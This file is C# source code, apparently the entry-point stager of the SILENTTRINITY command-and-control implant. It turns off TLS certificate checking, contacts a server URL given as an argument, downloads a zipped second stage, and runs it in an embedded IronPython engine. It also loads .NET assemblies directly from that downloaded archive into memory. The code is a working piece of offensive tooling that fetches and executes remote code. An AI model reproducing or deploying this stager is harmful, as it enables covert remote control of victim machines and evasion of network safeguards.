using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Net;
using SILENTTRINITY.Utilities;

namespace SILENTTRINITY
{
    public class ST
    {
        static ST()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 | (SecurityProtocolType)3072;

            AppDomain.CurrentDomain.AssemblyResolve += STResolveEventHandler;
        }

        static ZipStorer Stage;

        public static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("Usage: SILENTTRINITY.exe <URL> [<STAGE_URL>]");
                Environment.Exit(1);
            }

            Guid GUID = Guid.NewGuid();
            Uri URL = new Uri(new Uri(args[0]), GUID.ToString());

#if DEBUG
            Console.WriteLine("URL: {0}", URL);
            Console.WriteLine();
#endif

            Stage = ZipStorer.Open(Engines.IronPython.GetStage(URL), FileAccess.ReadWrite, true);

            Engines.IronPython.Run(URL, GUID, Stage);
        }

        static Assembly STResolveEventHandler(object sender, ResolveEventArgs args)
        {
            byte[] bytes = null;

            string DllName = Internals.GetDLLName(args.Name);

            bytes = Internals.GetResourceInZip(Stage, DllName);

            if (bytes == null)
            { 
                bytes = File.ReadAllBytes(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + DllName);
            }

            Assembly asm = Assembly.Load(bytes);

#if DEBUG
            Console.WriteLine("'{0}' loaded", asm.FullName);
#endif

            return asm;
        }
    }
}